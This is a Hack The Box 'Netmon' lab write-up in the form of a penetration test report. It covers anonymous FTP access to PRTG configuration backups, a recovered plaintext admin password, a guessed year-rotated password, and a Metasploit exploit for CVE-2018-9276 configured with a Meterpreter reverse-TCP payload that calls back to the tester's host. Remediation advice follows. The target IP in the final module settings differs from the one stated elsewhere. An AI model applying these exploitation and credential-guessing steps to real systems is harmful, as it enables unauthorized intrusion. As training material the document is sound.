# Hack The Box — Netmon
## Penetration Testing Report

**Assessment date:** November 12, 2026  
**Target:** `10.129.230.176` (Netmon- Hack The Box)  
**Operating system:** Windows  
**Outcome:** SYSTEM-level compromise; user and root flags retrieved  
**Scope:** Authorized Hack The Box lab environment

---

## 1. Executive Summary

A security assessment of the Netmon host identified weaknesses that, when combined, allowed an unauthenticated attacker to obtain complete control of the Windows system. The host exposed an FTP service that allowed anonymous users to browse and download files, including historical configuration data for its PRTG Network Monitor application. A backup contained an old administrative password. Although that password was no longer current, its year-based format provided a clue to a predictable replacement.

The host also ran an outdated version of PRTG Network Monitor affected by an authenticated command-injection vulnerability (CVE-2018-9276). After identifying the likely updated password, the tester used the PRTG exploit module and obtained a remote session running as `NT AUTHORITY\SYSTEM`, the highest local Windows security context. The user and root flags were both retrieved.

The compromise was enabled by **multiple weaknesses operating together**: anonymous access to sensitive files, retention of plaintext historical credentials, a predictable password update, and vulnerable monitoring software running with elevated privileges. Restricting FTP access, protecting configuration backups, enforcing stronger credential practices, and patching PRTG would disrupt this attack chain.

## 2. Assessment Overview

### 2.1 Objective and approach

The objective was to enumerate the lab host, identify an attack path, obtain access, and verify the resulting privilege level. Evidence was gathered from Nmap, FTP, local inspection of retrieved files, and Metasploit. This report reflects the observed replay rather than a generic walkthrough.

### 2.2 Evidence limitations

- The initial Nmap command scanned the default TCP port set, **not all 65,535 TCP ports**.
- The FTP server returned ASCII-transfer warnings for some binary downloads. The `.lnk` files were subsequently retrieved in binary mode, as confirmed by the tester. The ZIP backup extracted successfully, but an independent checksum verification was not recorded.
- The historical password was found in `PRTG Configuration.old.bak`. The separately retrieved ZIP archive contained `PRTG Configuration.dat`; the two sources should not be conflated.
- The recovered flags are omitted from the report narrative to avoid publishing lab proof tokens unnecessarily.

---

## 3. Reconnaissance

### 3.1 TCP service discovery

The initial scan used service version detection and default NSE scripts:

```bash
nmap -sV -sC 10.129.230.176 > nmap_scan
```

| Port | Service | Evidence / observation |
|---|---|---|
| 21/tcp | Microsoft FTP | Anonymous login allowed (`230`) |
| 80/tcp | HTTP / PRTG | `PRTG/18.1.37.13946` |
| 135/tcp | MSRPC | Windows RPC service |
| 139/tcp | NetBIOS | Windows network service |
| 445/tcp | SMB | SMB signing not required |
| 5985/tcp | WinRM / HTTPAPI | Microsoft HTTPAPI 2.0 |

The FTP NSE output showed folders consistent with a Windows system-drive root, including `Users`, `Windows`, and `Program Files (x86)`. The PRTG version was also confirmed on the HTTP login page.

### 3.2 Initial security hypotheses

Two areas merited investigation: anonymous FTP might expose sensitive files, and the dated PRTG installation might be affected by published vulnerabilities. At this stage neither credential disclosure nor remote code execution had been proven.

---

## 4. FTP Enumeration and Information Disclosure

### 4.1 Anonymous login

```text
$ ftp 10.129.230.176
220 Microsoft FTP Service
Name: anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
```

The FTP root exposed Windows directories. Navigating into `Users` showed `Administrator` and `Public`. Access to `Administrator` returned `550 Access is denied`, but `Public\Desktop` was readable.

### 4.2 User flag retrieval

```text
ftp> cd Users
ftp> cd Public
ftp> cd Desktop
ftp> ls
PRTG Enterprise Console.lnk
PRTG Network Monitor.lnk
user.txt
ftp> get user.txt
226 Transfer complete.
```

The downloaded file was read locally with `cat user.txt`, confirming successful unauthenticated file retrieval. This did **not** represent an interactive Windows logon or shell.

### 4.3 Shortcut artifact analysis

The two PRTG `.lnk` files were downloaded in binary mode and inspected using UTF-16LE string extraction:

```bash
strings -el 'PRTG Enterprise Console.lnk'
strings -el 'PRTG Network Monitor.lnk'
```

The shortcuts referenced:

```text
C:\Program Files (x86)\PRTG Network Monitor\PRTG Enterprise Console.exe
C:\Program Files (x86)\PRTG Network Monitor\PRTG GUI Starter.exe
```

Both also contained a Windows SID ending in RID `500`, associated with a built-in Administrator account. This metadata did not establish who created the shortcuts or prove execution under that account.

The tester navigated to the referenced installation directory via FTP and observed the corresponding executables, PRTG service binaries, a setup log, and application subdirectories. No usable credentials were established from those files.

### 4.4 Hidden ProgramData discovery

The FTP root listing did not display `ProgramData`, but direct navigation succeeded. This distinction matters: omission from a directory listing did not prevent access.

```text
ftp> cd /
ftp> cd ProgramData
ftp> cd Paessler
ftp> cd 'PRTG Network Monitor'
ftp> ls
Configuration Auto-Backups
PRTG Configuration.dat
PRTG Configuration.old
PRTG Configuration.old.bak
...
```

The data directory was located at:

```text
C:\ProgramData\Paessler\PRTG Network Monitor\
```

The above listed files were downloaded locally and inspected for potential credentials.

### 4.5 Historical credential exposure

Inspection of **`PRTG Configuration.old.bak`**, a separate historical file in the PRTG data directory, revealed:

```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
</dbpassword>
```

The comment identified `prtgadmin` as the associated user. The plaintext value was evidence of historical credential exposure, but its validity for the current web login was not yet established.

---

## 5. Vulnerability Research and Authentication

### 5.1 PRTG version and CVE-2018-9276

The PRTG web login page and Nmap both identified **PRTG Network Monitor 18.1.37.13946**. This version falls within the affected range of **CVE-2018-9276**, an authenticated OS command-injection vulnerability in PRTG notification functionality. Exploitation requires suitable PRTG administrative access.

Metasploit discovery returned modules for CVE-2023-32781 and an older authenticated PRTG RCE. The latter was selected for CVE-2018-9276:

```text
exploit/windows/http/prtg_authenticated_rce
```

The version-based check reported:

```text
[+] 10.129.230.176:80 - The target appears to be vulnerable.
Detected vulnerable version: 18.1.37.13946
```

This was a positive version check, **not** proof of code execution.

### 5.2 Failed authentication attempts

The first execution used default credentials (`prtgadmin:prtgadmin`) and failed:

```text
[-] Exploit aborted due to failure: no-access:
Failed to authenticate to the web interface
[*] Exploit completed, but no session was created.
```

During subsequent testing, a mistaken configuration placed the year-based candidate in the username field and the historical password in the password field. This also failed. The tester corrected the configuration: **the username remained `prtgadmin`; only the password was hypothesized to have changed**.

### 5.3 Password-rotation hypothesis

The historical backup exposed `PrTg@dmin2018`. The tester reasoned that the administrator might have changed only the year suffix in a later password. The candidate `PrTg@dmin2019` was therefore tested for the same `prtgadmin` account.

The important analytical step was not discovering an immediately valid credential, but recognizing that a retired password could reveal a **predictable credential-generation pattern**. The historical configuration and the later successful SYSTEM session support the resulting attack chain; the exact administrative change history was not independently observed.

---

## 6. Exploitation and Privilege Verification

### 6.1 Final module configuration

The recorded final Metasploit options were:

```text
Module:         exploit/windows/http/prtg_authenticated_rce
ADMIN_USERNAME: prtgadmin
ADMIN_PASSWORD: PrTg@dmin2019
RHOSTS:         10.129.85.71
RPORT:          80
Payload:        windows/meterpreter/reverse_tcp
LHOST:          10.10.14.90
LPORT:          4444
```

A Meterpreter session was subsequently obtained:  

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

This confirms execution in the Windows SYSTEM security context. No separate local privilege-escalation exploit was required in the recorded attack path.

### 6.2 Root flag retrieval

```text
meterpreter > pwd
C:\Users\Administrator\Desktop

meterpreter > ls
root.txt

meterpreter > cat root.txt
[redacted root flag]
```

Reading the Administrator's Desktop flag provided additional proof of access to protected resources. Both the user and root objectives were completed.

---

## 7. Attack Path Summary

1. **Discover services:** Nmap identified anonymous FTP and PRTG 18.1.37.13946.
2. **Validate anonymous access:** FTP permitted unauthenticated directory traversal and file retrieval.
3. **Collect initial evidence:** The user flag and PRTG shortcuts were downloaded from `Users\Public\Desktop`.
4. **Locate application data:** Direct access to hidden `ProgramData` revealed PRTG configuration and backup files.
5. **Recover historical password:** `PRTG Configuration.old.bak` exposed `PrTg@dmin2018` for `prtgadmin`.
6. **Infer password rotation:** The year-based pattern suggested `PrTg@dmin2019` as a candidate password.
7. **Exploit vulnerable PRTG:** The authenticated CVE-2018-9276 Metasploit module yielded a Meterpreter session.
8. **Prove impact:** `getuid` returned `NT AUTHORITY\SYSTEM`, and the Administrator's root flag was retrieved.

**Primary lesson:** The attack succeeded because separate weaknesses reinforced one another. A historical password that was no longer valid remained actionable when paired with predictable rotation and a vulnerable administrative service.

---

## 8. Findings and Remediation

Severity levels below are **qualitative assessments for this lab**, not calculated CVSS scores. Findings overlap because they describe different weaknesses in one demonstrated attack chain.

### Finding 1 — Anonymous FTP exposes sensitive application data

**Severity:** High  
**Evidence:** Anonymous login succeeded; application configuration backups were accessible beneath `C:\ProgramData\Paessler\PRTG Network Monitor\`.

**Impact:** Unauthenticated parties could retrieve sensitive configuration information, including historical authentication material.

**Remediation:**
- Disable anonymous FTP unless a documented business need exists.
- Restrict FTP to explicitly approved directories and identities; do not expose the system drive as an FTP root.
- Apply least-privilege filesystem permissions to application data and backups.
- Prefer secure, authenticated transfer methods and limit access by network policy.
- Audit FTP access and review whether sensitive files have been accessed or copied.

### Finding 2 — Plaintext historical credentials retained in accessible backup

**Severity:** High  
**Evidence:** `PRTG Configuration.old.bak` contained the `prtgadmin` password value `PrTg@dmin2018` in a readable XML element.

**Impact:** An exposed backup provided authentication-related material and a basis for inferring later passwords.

**Remediation:**
- Protect and encrypt configuration backups at rest where supported.
- Restrict backup access to authorized administrators and service identities.
- Review retention policies and securely remove unnecessary obsolete backups.
- Rotate any exposed credentials and investigate their reuse across services.
- Avoid storing recoverable plaintext secrets in files accessible to broad service accounts.

### Finding 3 — Predictable administrative password rotation

**Severity:** High  
**Evidence:** A year-based modification of the exposed 2018 password was used in the successful attack sequence.

**Impact:** Changing a predictable suffix does not reliably protect an account after an earlier password is disclosed.

**Remediation:**
- Replace patterned passwords with unique, randomly generated secrets.
- Use a password manager or approved secrets-management solution.
- Enable multifactor authentication where supported and applicable.
- Monitor administrative login attempts and apply suitable rate-limiting or lockout controls.
- Treat exposure of an old password as a reason to assess the strength and reuse of current credentials.

### Finding 4 — Outdated PRTG installation vulnerable to authenticated command injection

**Severity:** Critical in the demonstrated attack chain  
**Evidence:** PRTG 18.1.37.13946 was identified; CVE-2018-9276 was targeted; the resulting Meterpreter session ran as SYSTEM.

**Impact:** An attacker with administrative application access could execute commands with the privileges of the PRTG service, enabling full host compromise in this case.

**Remediation:**
- Upgrade PRTG to a supported, patched release that addresses CVE-2018-9276 and later security issues.
- Restrict access to the monitoring console to trusted management networks or VPN users.
- Minimize application administrator privileges and monitor changes to notification configuration.
- Review the PRTG service account and reduce operating-system privileges where compatible with operational requirements.
- Establish vulnerability and patch management for network-management systems, which are high-value administrative assets.

### Additional observation — SMB signing not required

**Status:** Observed, not exploited  
**Evidence:** Nmap reported SMB signing was not required.

**Recommendation:** Evaluate and enforce SMB signing according to the environment's compatibility requirements to reduce exposure to relevant relay attacks. This observation was not part of the successful compromise.

---

## 9. Conclusion

The Netmon assessment demonstrated a complete Windows host compromise through a chain of information disclosure, weak credential practices, and vulnerable software. Anonymous FTP access exposed PRTG configuration files. A historical backup disclosed an old password, and a predictable year-based variation supplied the likely current credential. Authenticated exploitation of CVE-2018-9276 then yielded a Meterpreter session executing as `NT AUTHORITY\SYSTEM`.

The most consequential investigative step was interpreting the historical password rather than treating it as useless after the default login failed. The exercise illustrates why rotating a compromised password is insufficient when the replacement follows an easily inferred pattern. It also shows why configuration backups must receive the same access protections as active application data.

**Final outcome:** User flag retrieved, SYSTEM privileges confirmed, and root flag retrieved.

---

## 10. References

- MITRE CVE Program. **CVE-2018-9276**. https://www.cve.org/CVERecord?id=CVE-2018-9276
- Rapid7 Metasploit Framework. **PRTG Network Monitor Authenticated RCE** (`exploit/windows/http/prtg_authenticated_rce`). https://www.rapid7.com/db/modules/exploit/windows/http/prtg_authenticated_rce/
- Nmap Project. **Nmap Reference Guide**. https://nmap.org/book/man.html

*This report documents testing conducted within an authorized Hack The Box lab environment. Use of LLM technology limited to note-taking and documentations only*
